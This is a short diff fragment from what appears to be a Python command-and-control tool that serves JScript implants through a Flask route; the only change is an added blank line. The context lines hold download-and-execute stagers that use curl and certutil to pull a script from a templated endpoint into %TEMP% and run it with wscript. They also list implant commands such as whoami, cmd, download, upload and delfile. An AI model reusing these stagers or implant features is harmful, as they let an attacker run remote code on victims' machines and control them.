@@ -12,6 +12,7 @@ delivery = f'curl ~endpoint~ -o {artifact}.js && wscript /e:jscript {artifact}.j
            f'certutil -urlcache -split -f ~endpoint~ %TEMP%/sgHIHMPJMN.js && wscript /e:jscript %TEMP%/sgHIHMPJMN.js'
 commands = 'delay,dir,hostname,whoami,os,cmd,delfile,download,upload'
 
+
 @jscript.route(f'/{endpoint}', methods=['GET'])
 def generate_jscript_implant():
     """
